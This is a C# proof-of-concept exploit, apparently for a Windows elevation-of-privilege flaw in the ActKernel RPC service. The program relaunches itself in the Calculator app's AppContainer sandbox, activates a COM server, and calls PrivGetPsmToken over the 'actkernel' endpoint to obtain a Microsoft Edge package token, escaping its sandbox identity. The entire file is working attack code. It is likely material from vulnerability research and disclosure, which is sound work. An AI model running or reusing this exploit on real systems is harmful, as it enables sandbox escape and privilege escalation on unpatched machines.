using NtApiDotNet;
using NtApiDotNet.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace PoC_ActKernel_SecurityCallback_EoP
{
    class Program
    {
        static bool IsInAppContainer()
        {
            using (var token = NtToken.OpenProcessToken())
            {
                return token.AppContainer;
            }
        }

        [Flags]
        public enum CLSCTX : uint
        {
            INPROC_SERVER = 0x1,
            INPROC_HANDLER = 0x2,
            LOCAL_SERVER = 0x4,
            INPROC_SERVER16 = 0x8,
            REMOTE_SERVER = 0x10,
            INPROC_HANDLER16 = 0x20,
            RESERVED1 = 0x40,
            RESERVED2 = 0x80,
            RESERVED3 = 0x100,
            RESERVED4 = 0x200,
            NO_CODE_DOWNLOAD = 0x400,
            RESERVED5 = 0x800,
            NO_CUSTOM_MARSHAL = 0x1000,
            ENABLE_CODE_DOWNLOAD = 0x2000,
            NO_FAILURE_LOG = 0x4000,
            DISABLE_AAA = 0x8000,
            ENABLE_AAA = 0x10000,
            FROM_DEFAULT_CONTEXT = 0x20000,
            ACTIVATE_32_BIT_SERVER = 0x40000,
            ACTIVATE_64_BIT_SERVER = 0x80000,
            ENABLE_CLOAKING = 0x100000,
            APPCONTAINER = 0x400000,
            ACTIVATE_AAA_AS_IU = 0x800000,
            ACTIVATE_NATIVE_SERVER = 0x1000000,
            ACTIVATE_ARM32_SERVER = 0x2000000,
            PS_DLL = 0x80000000,
            SERVER = INPROC_SERVER | LOCAL_SERVER | REMOTE_SERVER,
            ALL = INPROC_SERVER | INPROC_HANDLER | LOCAL_SERVER | REMOTE_SERVER
        }

        [DllImport("ole32.dll", PreserveSig = false)]
        [return: MarshalAs(UnmanagedType.IUnknown)]
        private static extern object CoCreateInstance(ref Guid rclsid, IntPtr pUnkOuter, CLSCTX dwClsContext, ref Guid riid);

        static string CopyFile(string temp_dir, Type t)
        {
            string curr_loc = t.Assembly.Location;
            string exe_path = Path.Combine(temp_dir, Path.GetFileName(curr_loc));
            File.Copy(curr_loc, exe_path);
            Console.WriteLine("Copied to {0}", exe_path);
            return exe_path;
        }

        static string CopyToTempDir()
        {
            string temp_dir = Path.GetTempFileName();
            File.Delete(temp_dir);
            DirectorySecurity security = new DirectorySecurity();
            security.SetSecurityDescriptorSddlForm("D:(A;OICIIO;GA;;;OW)(A;OICIIO;GRGX;;;AC)(A;;GA;;;OW)(A;;GRGX;;;AC)");
            Directory.CreateDirectory(temp_dir, security);
            Console.WriteLine("Created directory {0}", temp_dir);
            string curr_loc = CopyFile(temp_dir, typeof(Program));
            CopyFile(temp_dir, typeof(NtFile));
            return curr_loc;
        }

        static void Main(string[] args)
        {
            try
            {
                if (!IsInAppContainer())
                {
                    if (args.Length > 0)
                    {
                        throw new ArgumentException("Already started");
                    }

                    Win32ProcessConfig config = new Win32ProcessConfig();
                    config.ApplicationName = CopyToTempDir();
                    config.CommandLine = "run abc";
                    config.AppContainerSid = TokenUtils.DerivePackageSidFromName("microsoft.windowscalculator_8wekyb3d8bbwe");
                    config.CreationFlags = CreateProcessFlags.NewConsole;
                    using (var p = Win32Process.CreateProcess(config))
                    {
                        p.Process.Wait();
                    }
                }
                else
                {
                    Console.WriteLine("In AC");
                    Console.WriteLine("idiot");
                    // Spawn an OOP process to init 
                    Guid clsid = new Guid("ce0e0be8-cf56-4577-9577-34cc96ac087c");
                    Guid iid = new Guid("00000000-0000-0000-c000-000000000046");
                    CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX.LOCAL_SERVER, ref iid);
                    using (var client = new Client())
                    {
                        client.Connect("actkernel");
                        uint res = client.PrivGetPsmToken(0x40000001, 0, "Microsoft.MicrosoftEdge_44.18362.1.0_neutral__8wekyb3d8bbwe",
                                "Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge", out NtToken token, out int a);
                        if (res != 0)
                        {
                            throw new SafeWin32Exception((int)res);
                        }

                        using (token)
                        {
                            Console.WriteLine("{0} - Handle: {1:X}", token, token.Handle.DangerousGetHandle().ToInt32());
                            Console.WriteLine("Package Sid: {0}", token.AppContainerSid.Name);
                            Console.WriteLine("AppId: {0}", token.PackageFullName);
                            Console.ReadLine();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                Console.ReadLine();
            }
        }
    }
}
